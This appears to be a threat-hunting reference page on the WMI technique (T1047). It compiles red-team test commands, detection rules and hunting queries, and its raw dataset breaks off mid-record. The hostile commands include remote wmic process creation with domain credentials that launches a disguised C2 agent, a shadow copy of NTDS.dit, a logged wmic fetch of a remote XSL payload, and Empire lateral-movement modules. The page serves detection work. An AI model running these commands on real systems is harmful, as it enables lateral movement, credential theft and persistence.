
# Windows Management Instrumentation

## Description

### MITRE Description

> Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1047

## Potential Commands

```
wmic useraccount get /ALL /format:csv

wmic process get caption,executablepath,commandline /format:csv

wmic qfe get description,installedOn /format:csv

wmic /node:"127.0.0.1" service where (caption like "%#{service_search_string}%")

wmic /node:"#{node}" service where (caption like "%Spooler%")

wmic process call create notepad.exe

wmic /node:"127.0.0.1" process call create #{process_to_execute}

wmic /node:"#{node}" process call create notepad.exe

{'windows': {'psh': {'command': 'wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n'}}}
{'windows': {'psh': {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh";\n', 'cleanup': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" call terminate;\n'}, 'cmd': {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd";\n', 'cleanup': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" call terminate;\n'}}}
{'windows': {'psh': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:#{domain.user.name} /password:#{domain.user.password} process call create "taskkill /f /im s4ndc4t.exe"\n'}}}
wmic.exe /NODE:*process call create*
wmic.exe /NODE:*path AntiVirusProduct get*
wmic.exe /NODE:*path FirewallProduct get*
WmiPrvSE.exe
wmic.exe /NODE: "192.168.0.1" process call create "*.exe"
wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM <path> ^> <path>"
wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
powershell/lateral_movement/invoke_wmi
powershell/lateral_movement/invoke_wmi
powershell/persistence/elevated/wmi
powershell/persistence/elevated/wmi
Log
#sysmon log
EventID: 1
Image: C: \ Windows \ System32 \ wbem \ WMIC.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: WMI Commandline Utility
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl "

# Win7 security log
EventID: 4688
Process information:
New Process ID: 0x888
New Process name: 'C: \ Windows \ System32 \ wbem \ WMIC.exe'
```

## Commands Dataset

```
[{'command': 'wmic useraccount get /ALL /format:csv\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': 'wmic process get caption,executablepath,commandline '
             '/format:csv\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': 'wmic qfe get description,installedOn /format:csv\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': 'wmic /node:"127.0.0.1" service where (caption like '
             '"%#{service_search_string}%")\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': 'wmic /node:"#{node}" service where (caption like "%Spooler%")\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': 'wmic process call create notepad.exe\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': 'wmic /node:"127.0.0.1" process call create '
             '#{process_to_execute}\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': 'wmic /node:"#{node}" process call create notepad.exe\n',
  'name': None,
  'source': 'atomics/T1047/T1047.yaml'},
 {'command': {'windows': {'psh': {'command': 'wmic process get '
                                             'executablepath,name,processid,parentprocessid '
                                             '>> $env:APPDATA\\vmtools.log;\n'
                                             'cat '
                                             '$env:APPDATA\\vmtools.log\n'}}},
  'name': 'Capture process id, executable path, pid and parent pid before '
          'writing to disk',
  'source': 'data/abilities/collection/94f21386-9547-43c4-99df-938ab05d45ce.yml'},
 {'command': {'windows': {'cmd': {'cleanup': 'wmic /node:#{remote.host.ip} '
                                             '/user:#{domain.user.name} '
                                             '/password:#{domain.user.password} '
                                             'process where '
                                             '"ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" '
                                             'call terminate;\n',
                                  'command': 'wmic /node:#{remote.host.ip} '
                                             '/user:#{domain.user.name} '
                                             '/password:#{domain.user.password} '
                                             'process call create "cmd.exe /c '
                                             'C:\\Users\\Public\\svchost.exe '
                                             '-server #{server} -executors '
                                             'cmd";\n'},
                          'psh': {'cleanup': 'wmic /node:#{remote.host.ip} '
                                             '/user:#{domain.user.name} '
                                             '/password:#{domain.user.password} '
                                             'process where '
                                             '"ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" '
                                             'call terminate;\n',
                                  'command': 'wmic /node:#{remote.host.ip} '
                                             '/user:#{domain.user.name} '
                                             '/password:#{domain.user.password} '
                                             'process call create '
                                             '"powershell.exe '
                                             'C:\\Users\\Public\\svchost.exe '
                                             '-server #{server} -executors '
                                             'psh";\n'}}},
  'name': 'Remotely executes 54ndc47 over WMI',
  'source': 'data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml'},
 {'command': {'windows': {'psh': {'cleanup': 'wmic '
                                             '/node:`"#{remote.host.fqdn}`" '
                                             '/user:#{domain.user.name} '
                                             '/password:#{domain.user.password} '
                                             'process call create "taskkill /f '
                                             '/im s4ndc4t.exe"\n',
                                  'command': 'wmic '
                                             '/node:`"#{remote.host.fqdn}`" '
                                             '/user:#{domain.user.name} '
                                             '/password:#{domain.user.password} '
                                             'process call create '
                                             '"powershell.exe '
                                             'C:\\Users\\Public\\s4ndc4t.exe '
                                             '-server #{server} -group '
                                             '#{group} -executors psh";\n'}}},
  'name': 'Remotely executes 54ndc47 over WMI',
  'source': 'data/abilities/execution/ece5dde3-d370-4c20-b213-a1f424aa8d03.yml'},
 {'command': 'wmic.exe /NODE:*process call create*',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'wmic.exe /NODE:*path AntiVirusProduct get*',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'wmic.exe /NODE:*path FirewallProduct get*',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'WmiPrvSE.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'wmic.exe /NODE: "192.168.0.1" process call create "*.exe"',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM '
             '<path> ^> <path>"',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c '
             'vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > '
             'c:\\not_the_NTDS.dit"',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell/lateral_movement/invoke_wmi',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_wmi',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/elevated/wmi',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/elevated/wmi',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'Log\n'
             '#sysmon log\n'
             'EventID: 1\n'
             'Image: C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe\n'
             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
             'Description: WMI Commandline Utility\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: wmic.exe\n'
             'CommandLine: wmic os get '
             '/FORMAT:"http://192.168.126.146:9996/6G69i.xsl "\n'
             '\n'
             '# Win7 security log\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0x888\n'
             "New Process name: 'C: \\ Windows \\ System32 \\ wbem \\ "
             "WMIC.exe'",
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Markus Neis / Florian Roth',
                  'description': 'Detects WMI SquiblyTwo Attack with possible '
                                 'renamed WMI by looking for imphash',
                  'detection': {'condition': '1 of them',
                                'selection1': {'CommandLine': ['wmic * '
                                                               '*format:\\"http*',
                                                               'wmic * '
                                                               "/format:'http",
                                                               'wmic * '
                                                               '/format:http*'],
                                               'Image': ['*\\wmic.exe']},
                                'selection2': {'CommandLine': ['* '
                                                               '*format:\\"http*',
                                                               '* '
                                                               "/format:'http",
                                                               '* '
                                                               '/format:http*'],
                                               'Imphash': ['1B1A3F43BF37B5BFE60751F2EE2F326E',
                                                           '37777A96245A3C74EB217308F3546F4C',
                                                           '9D87C9D67CE724033C0B40CC4CA1B206']}},
                  'falsepositives': ['Unknown'],
                  'id': '8d63dadf-b91b-4187-87b6-34a1114577ea',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://subt0x11.blogspot.ch/2018/04/wmicexe-whitelisting-bypass-hacking.html',
                                 'https://twitter.com/mattifestation/status/986280382042595328'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion', 'attack.t1047'],
                  'title': 'SquiblyTwo'}},
 {'data_source': {'author': 'Michael Haag, Florian Roth, juju4',
                  'description': 'Detects WMI executing suspicious commands',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['*/NODE:*process '
                                                              'call create *',
                                                              '* path '
                                                              'AntiVirusProduct '
                                                              'get *',
                                                              '* path '
                                                              'FirewallProduct '
                                                              'get *',
                                                              '* shadowcopy '
                                                              'delete *'],
                                              'Image': ['*\\wmic.exe']}},
                  'falsepositives': ['Will need to be tuned',
                                     'If using Splunk, I recommend | stats '
                                     'count by Computer,CommandLine following '
                                     'for easy hunting by '
                                     'Computer/CommandLine.'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '526be59f-a573-4eea-b5f7-f0973207634d',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://digital-forensics.sans.org/blog/2010/06/04/wmic-draft/',
                                 'https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1',
                                 'https://blog.malwarebytes.com/threat-analysis/2016/04/rokku-ransomware/'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.t1047',
                           'car.2016-03-002'],
                  'title': 'Suspicious WMI execution'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Detection of logins performed with WMI',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 4624,
                                              'ProcessName': '*\\WmiPrvSE.exe'}},
                  'falsepositives': ['Monitoring tools',
                                     'Legitimate system administration'],
                  'id': '5af54681-df95-4c26-854f-2565e13cfab0',
                  'level': 'low',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'status': 'stable',
                  'tags': ['attack.execution', 'attack.t1047'],
                  'title': 'Login with WMI'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects suspicious WMI event filter and '
                                 'command line event consumer based on event '
                                 'id 5861 and 5859 (Windows 10, 2012 and '
                                 'higher)',
                  'detection': {'condition': 'selection and 1 of keywords or '
                                             'selection2',
                                'keywords': {'Message': ['*ActiveScriptEventConsumer*',
                                                         '*CommandLineEventConsumer*',
                                                         '*CommandLineTemplate*']},
                                'selection': {'EventID': 5861},
                                'selection2': {'EventID': 5859}},
                  'falsepositives': ['Unknown (data set is too small; further '
                                     'testing needed)'],
                  'id': '0b7889b4-5577-4521-a60a-3376ee7f9f7b',
                  'level': 'medium',
                  'logsource': {'product': 'windows', 'service': 'wmi'},
                  'references': ['https://twitter.com/mattifestation/status/899646620148539397',
                                 'https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.persistence',
                           'attack.t1047'],
                  'title': 'WMI Persistence'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'date': '2018/03/07',
                  'description': 'Detects WMI script event consumers',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': 'C:\\WINDOWS\\system32\\wbem\\scrcons.exe',
                                              'ParentImage': 'C:\\Windows\\System32\\svchost.exe'}},
                  'falsepositives': ['Legitimate event consumers'],
                  'id': 'ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.persistence',
                           'attack.t1047'],
                  'title': 'WMI Persistence - Script Event Consumer'}}]
```

## Potential Queries

```json
[{'name': 'WMI Command Execution',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 20 and wmi_consumer_type contains '
           '"Command Line"'},
 {'name': 'Windows Management Instrumentation Active Script Event Consumer '
          'FileAccess',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 11 and process_command_line contains '
           '"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe"'},
 {'name': 'Windows Management Instrumentation Active Script Event Consumer '
          'Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_parent_command_line '
           'contains "C:\\\\Windows\\\\System32\\\\svchost.exe"or '
           'process_command_line contains '
           '"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe")'},
 {'name': 'Windows Management Instrumentation Network',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3 and (process_path contains "wmic.exe"or '
           'process_command_line contains "wmic")'},
 {'name': 'Windows Management Instrumentation Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_parent_command_line '
           'contains "wmiprvse.exe"or process_path contains "wmic.exe"or '
           'process_command_line contains "wmic")'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Create a remote process by wmic\n'
           'description: windows server 2016\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           'product: windows\n'
           'service: system\n'
           'detection:\n'
           'selection:\n'
           'EventID: 4688 # Process Creation\n'
           "Newprocessname: 'C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe' # "
           'new process name\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Creatorprocessname: 'C: \\ Windows "
           "\\ System32 \\ cmd.exe' # creator process name\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Processcommandline: 'wmic.exe / "
           "node: * process *' # command-line process\n"
           'condition: selection\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Windows Management Instrumentation': {'atomic_tests': [{'description': 'An '
                                                                                                 'adversary '
                                                                                                 'might '
                                                                                                 'use '
                                                                                                 'WMI '
                                                                                                 'to '
                                                                                                 'list '
                                                                                                 'all '
                                                                                                 'local '
                                                                                                 'User '
                                                                                                 'Accounts. \n'
                                                                                                 'When '
                                                                                                 'the '
                                                                                                 'test '
                                                                                                 'completes '
                                                                                                 ', '
                                                                                                 'there '
                                                                                                 'should '
                                                                                                 'be '
                                                                                                 'local '
                                                                                                 'user '
                                                                                                 'accounts '
                                                                                                 'information '
                                                                                                 'displayed '
                                                                                                 'on '
                                                                                                 'the '
                                                                                                 'command '
                                                                                                 'line.\n',
                                                                                  'executor': {'command': 'wmic '
                                                                                                          'useraccount '
                                                                                                          'get '
                                                                                                          '/ALL '
                                                                                                          '/format:csv\n',
                                                                                               'elevation_required': False,
                                                                                               'name': 'command_prompt'},
                                                                                  'name': 'WMI '
                                                                                          'Reconnaissance '
                                                                                          'Users',
                                                                                  'supported_platforms': ['windows']},
                                                                                 {'description': 'An '
                                                                                                 'adversary '
                                                                                                 'might '
                                                                                                 'use '
                                                                                                 'WMI '
                                                                                                 'to '
                                                                                                 'list '
                                                                                                 'Processes '
                                                                                                 'running '
                                                                                                 'on '
                                                                                                 'the '
                                                                                                 'compromised '
                                                                                                 'host.\n'
                                                                                                 'When '
                                                                                                 'the '
                                                                                                 'test '
                                                                                                 'completes '
                                                                                                 ', '
                                                                                                 'there '
                                                                                                 'should '
                                                                                                 'be '
                                                                                                 'running '
                                                                                                 'processes '
                                                                                                 'listed '
                                                                                                 'on '
                                                                                                 'the '
                                                                                                 'command '
                                                                                                 'line.\n',
                                                                                  'executor': {'command': 'wmic '
                                                                                                          'process '
                                                                                                          'get '
                                                                                                          'caption,executablepath,commandline '
                                                                                                          '/format:csv\n',
                                                                                               'elevation_required': False,
                                                                                               'name': 'command_prompt'},
                                                                                  'name': 'WMI '
                                                                                          'Reconnaissance '
                                                                                          'Processes',
                                                                                  'supported_platforms': ['windows']},
                                                                                 {'description': 'An '
                                                                                                 'adversary '
                                                                                                 'might '
                                                                                                 'use '
                                                                                                 'WMI '
                                                                                                 'to '
                                                                                                 'list '
                                                                                                 'installed '
                                                                                                 'Software '
                                                                                                 'hotfix '
                                                                                                 'and '
                                                                                                 'patches.\n'
                                                                                                 'When '
                                                                                                 'the '
                                                                                                 'test '
                                                                                                 'completes, '
                                                                                                 'there '
                                                                                                 'should '
                                                                                                 'be '
                                                                                                 'a '
                                                                                                 'list '
                                                                                                 'of '
                                                                                                 'installed '
                                                                                                 'patches '
                                                                                                 'and '
                                                                                                 'when '
                                                                                                 'they '
                                                                                                 'were '
                                                                                                 'installed.\n',
                                                                                  'executor': {'command': 'wmic '
                                                                                                          'qfe '
                                                                                                          'get '
                                                                                                          'description,installedOn '
                                                                                                          '/format:csv\n',
                                                                                               'elevation_required': False,
                                                                                               'name': 'command_prompt'},
                                                                                  'name': 'WMI '
                                                                                          'Reconnaissance '
                                                                                          'Software',
                                                                                  'supported_platforms': ['windows']},
                                                                                 {'description': 'An '
                                                                                                 'adversary '
                                                                                                 'might '
                                                                                                 'use '
                                                                                                 'WMI '
                                                                                                 'to '
                                                                                                 'check '
                                                                                                 'if '
                                                                                                 'a '
                                                                                                 'certain '
                                                                                                 'Remote '
                                                                                                 'Service '
                                                                                                 'is '
                                                                                                 'running '
                                                                                                 'on '
                                                                                                 'a '
                                                                                                 'remote '
                                                                                                 'device. \n'
                                                                                                 'When '
                                                                                                 'the '
                                                                                                 'test '
                                                                                                 'completes, '
                                                                                                 'a '
                                                                                                 'service '
                                                                                                 'information '
                                                                                                 'will '
                                                                                                 'be '
                                                                                                 'displayed '
                                                                                                 'on '
                                                                                                 'the '
                                                                                                 'screen '
                                                                                                 'if '
                                                                                                 'it '
                                                                                                 'exists.\n'
                                                                                                 'A '
                                                                                                 'common '
                                                                                                 'feedback '
                                                                                                 'message '
                                                                                                 'is '
                                                                                                 'that '
                                                                                                 '"No '
                                                                                                 'instance(s) '
                                                                                                 'Available" '
                                                                                                 'if '
                                                                                                 'the '
                                                                                                 'service '
                                                                                                 'queried '
                                                                                                 'is '
                                                                                                 'not '
                                                                                                 'running.\n'
                                                                                                 'A '
                                                                                                 'common '
                                                                                                 'error '
                                                                                                 'message '
                                                                                                 'is '
                                                                                                 '"Node '
                                                                                                 '- '
                                                                                                 '(provided '
                                                                                                 'IP '
                                                                                                 'or '
                                                                                                 'default)  '
                                                                                                 'ERROR '
                                                                                                 'Description '
                                                                                                 '=The '
                                                                                                 'RPC '
                                                                                                 'server '
                                                                                                 'is '
                                                                                                 'unavailable" \n'
                                                                                                 'if '
                                                                                                 'the '
                                                                                                 'provided '
                                                                                                 'remote '
                                                                                                 'host '
                                                                                                 'is '
                                                                                                 'unreacheable\n',
                                                                                  'executor': {'command': 'wmic '
                                                                                                          '/node:"#{node}" '
                                                                                                          'service '
                                                                                                          'where '
                                                                                                          '(caption '
                                                                                                          'like '
                                                                                                          '"%#{service_search_string}%")\n',
                                                                                               'elevation_required': False,
                                                                                               'name': 'command_prompt'},
                                                                                  'input_arguments': {'node': {'default': '127.0.0.1',
                                                                                                               'description': 'Ip '
                                                                                                                              'Address',
                                                                                                               'type': 'String'},
                                                                                                      'service_search_string': {'default': 'Spooler',
                                                                                                                                'description': 'Name '
                                                                                                                                               'Of '
                                                                                                                                               'Service',
                                                                                                                                'type': 'String'}},
                                                                                  'name': 'WMI '
                                                                                          'Reconnaissance '
                                                                                          'List '
                                                                                          'Remote '
                                                                                          'Services',
                                                                                  'supported_platforms': ['windows']},
                                                                                 {'description': 'This '
                                                                                                 'test '
                                                                                                 'uses '
                                                                                                 'wmic.exe '
                                                                                                 'to '
                                                                                                 'execute '
                                                                                                 'a '
                                                                                                 'process '
                                                                                                 'on '
                                                                                                 'the '
                                                                                                 'local '
                                                                                                 'host.\n'
                                                                                                 'When '
                                                                                                 'the '
                                                                                                 'test '
                                                                                                 'completes '
                                                                                                 ', '
                                                                                                 'a '
                                                                                                 'new '
                                                                                                 'process '
                                                                                                 'will '
                                                                                                 'be '
                                                                                                 'started '
                                                                                                 'locally '
                                                                                                 '.A '
                                                                                                 'notepad '
                                                                                                 'application '
                                                                                                 'will '
                                                                                                 'be '
                                                                                                 'started '
                                                                                                 'when '
                                                                                                 'input '
                                                                                                 'is '
                                                                                                 'left '
                                                                                                 'on '
                                                                                                 'default.\n',
                                                                                  'executor': {'cleanup_command': 'wmic '
                                                                                                                  'process '
                                                                                                                  'where '
                                                                                                                  "name='#{process_to_execute}' "
                                                                                                                  'delete '
                                                                                                                  '>nul '
                                                                                                                  '2>&1\n',
                                                                                               'command': 'wmic '
                                                                                                          'process '
                                                                                                          'call '
                                                                                                          'create '
                                                                                                          '#{process_to_execute}\n',
                                                                                               'elevation_required': False,
                                                                                               'name': 'command_prompt'},
                                                                                  'input_arguments': {'process_to_execute': {'default': 'notepad.exe',
                                                                                                                             'description': 'Name '
                                                                                                                                            'or '
                                                                                                                                            'path '
                                                                                                                                            'of '
                                                                                                                                            'process '
                                                                                                                                            'to '
                                                                                                                                            'execute.',
                                                                                                                             'type': 'String'}},
                                                                                  'name': 'WMI '
                                                                                          'Execute '
                                                                                          'Local '
                                                                                          'Process',
                                                                                  'supported_platforms': ['windows']},
                                                                                 {'description': 'This '
                                                                                                 'test '
                                                                                                 'uses '
                                                                                                 'wmic.exe '
                                                                                                 'to '
                                                                                                 'execute '
                                                                                                 'a '
                                                                                                 'process '
                                                                                                 'on '
                                                                                                 'a '
                                                                                                 'remote '
                                                                                                 'host. '
                                                                                                 'Specify '
                                                                                                 'a '
                                                                                                 'valid '
                                                                                                 'value '
                                                                                                 'for '
                                                                                                 'remote '
                                                                                                 'IP '
                                                                                                 'using '
                                                                                                 'the '
                                                                                                 'node '
                                                                                                 'parameter.\n'
                                                                                                 'To '
                                                                                                 'clean '
                                                                                                 'up, '
                                                                                                 'provide '
                                                                                                 'the '
                                                                                                 'same '
                                                                                                 'node '
                                                                                                 'input '
                                                                                                 'as '
                                                                                                 'the '
                                                                                                 'one '
                                                                                                 'provided '
                                                                                                 'to '
                                                                                                 'run '
                                                                                                 'the '
                                                                                                 'test\n'
                                                                                                 'A '
                                                                                                 'common '
                                                                                                 'error '
                                                                                                 'message '
                                                                                                 'is '
                                                                                                 '"Node '
                                                                                                 '- '
                                                                                                 '(provided '
                                                                                                 'IP '
                                                                                                 'or '
                                                                                                 'default)  '
                                                                                                 'ERROR '
                                                                                                 'Description '
                                                                                                 '=The '
                                                                                                 'RPC '
                                                                                                 'server '
                                                                                                 'is '
                                                                                                 'unavailable" '
                                                                                                 'if '
                                                                                                 'the '
                                                                                                 'default '
                                                                                                 'or '
                                                                                                 'provided '
                                                                                                 'IP '
                                                                                                 'is '
                                                                                                 'unreachable \n',
                                                                                  'executor': {'cleanup_command': 'wmic '
                                                                                                                  '/node:"#{node}" '
                                                                                                                  'process '
                                                                                                                  'where '
                                                                                                                  "name='#{process_to_execute}' "
                                                                                                                  'delete '
                                                                                                                  '>nul '
                                                                                                                  '2>&1\n',
                                                                                               'command': 'wmic '
                                                                                                          '/node:"#{node}" '
                                                                                                          'process '
                                                                                                          'call '
                                                                                                          'create '
                                                                                                          '#{process_to_execute}\n',
                                                                                               'elevation_required': False,
                                                                                               'name': 'command_prompt'},
                                                                                  'input_arguments': {'node': {'default': '127.0.0.1',
                                                                                                               'description': 'Ip '
                                                                                                                              'Address',
                                                                                                               'type': 'String'},
                                                                                                      'process_to_execute': {'default': 'notepad.exe',
                                                                                                                             'description': 'Name '
                                                                                                                                            'or '
                                                                                                                                            'path '
                                                                                                                                            'of '
                                                                                                                                            'process '
                                                                                                                                            'to '
                                                                                                                                            'execute.',
                                                                                                                             'type': 'String'}},
                                                                                  'name': 'WMI '
                                                                                          'Execute '
                                                                                          'Remote '
                                                                                          'Process',
                                                                                  'supported_platforms': ['windows']}],
                                                                'attack_technique': 'T1047',
                                                                'display_name': 'Windows '
                                                                                'Management '
                                                                                'Instrumentation'}},
 {'Mitre Stockpile - Capture process id, executable path, pid and parent pid before writing to disk': {'description': 'Capture '
                                                                                                                      'process '
                                                                                                                      'id, '
                                                                                                                      'executable '
                                                                                                                      'path, '
                                                                                                                      'pid '
                                                                                                                      'and '
                                                                                                                      'parent '
                                                                                                                      'pid '
                                                                                                                      'before '
                                                                                                                      'writing '
                                                                                                                      'to '
                                                                                                                      'disk',
                                                                                                       'id': '94f21386-9547-43c4-99df-938ab05d45ce',
                                                                                                       'name': 'WMIC '
                                                                                                               'Process '
                                                                                                               'Enumeration',
                                                                                                       'platforms': {'windows': {'psh': {'command': 'wmic '
                                                                                                                                                    'process '
                                                                                                                                                    'get '
                                                                                                                                                    'executablepath,name,processid,parentprocessid '
                                                                                                                                                    '>> '
                                                                                                                                                    '$env:APPDATA\\vmtools.log;\n'
                                                                                                                                                    'cat '
                                                                                                                                                    '$env:APPDATA\\vmtools.log\n'}}},
                                                                                                       'tactic': 'collection',
                                                                                                       'technique': {'attack_id': 'T1047',
                                                                                                                     'name': 'WMIC'}}},
 {'Mitre Stockpile - Remotely executes 54ndc47 over WMI': {'description': 'Remotely '
                                                                          'executes '
                                                                          '54ndc47 '
                                                                          'over '
                                                                          'WMI',
                                                           'id': '2a32e46f-5346-45d3-9475-52b857c05342',
                                                           'name': 'Start '
                                                                   '54ndc47 '
                                                                   '(WMI)',
                                                           'platforms': {'windows': {'cmd': {'cleanup': 'wmic '
                                                                                                        '/node:#{remote.host.ip} '
                                                                                                        '/user:#{domain.user.name} '
                                                                                                        '/password:#{domain.user.password} '
                                                                                                        'process '
                                                                                                        'where '
                                                                                                        '"ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" '
                                                                                                        'call '
                                                                                                        'terminate;\n',
                                                                                             'command': 'wmic '
                                                                                                        '/node:#{remote.host.ip} '
                                                                                                        '/user:#{domain.user.name} '
                                                                                                        '/password:#{domain.user.password} '
                                                                                                        'process '
                                                                                                        'call '
                                                                                                        'create '
                                                                                                        '"cmd.exe '
                                                                                                        '/c '
                                                                                                        'C:\\Users\\Public\\svchost.exe '
                                                                                                        '-server '
                                                                                                        '#{server} '
                                                                                                        '-executors '
                                                                                                        'cmd";\n'},
                                                                                     'psh': {'cleanup': 'wmic '
                                                                                                        '/node:#{remote.host.ip} '
                                                                                                        '/user:#{domain.user.name} '
                                                                                                        '/password:#{domain.user.password} '
                                                                                                        'process '
                                                                                                        'where '
                                                                                                        '"ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" '
                                                                                                        'call '
                                                                                                        'terminate;\n',
                                                                                             'command': 'wmic '
                                                                                                        '/node:#{remote.host.ip} '
                                                                                                        '/user:#{domain.user.name} '
                                                                                                        '/password:#{domain.user.password} '
                                                                                                        'process '
                                                                                                        'call '
                                                                                                        'create '
                                                                                                        '"powershell.exe '
                                                                                                        'C:\\Users\\Public\\svchost.exe '
                                                                                                        '-server '
                                                                                                        '#{server} '
                                                                                                        '-executors '
                                                                                                        'psh";\n'}}},
                                                           'requirements': [{'plugins.stockpile.app.requirements.basic': [{'edge': 'has_password',
                                                                                                                           'source': 'domain.user.name',
                                                                                                                           'target': 'domain.user.password'}]}],
                                                           'tactic': 'execution',
                                                           'technique': {'attack_id': 'T1047',
                                                                         'name': 'Windows '
                                                                                 'Management '
                                                                                 'Instrumentation'}}},
 {'Mitre Stockpile - Remotely executes 54ndc47 over WMI': {'description': 'Remotely '
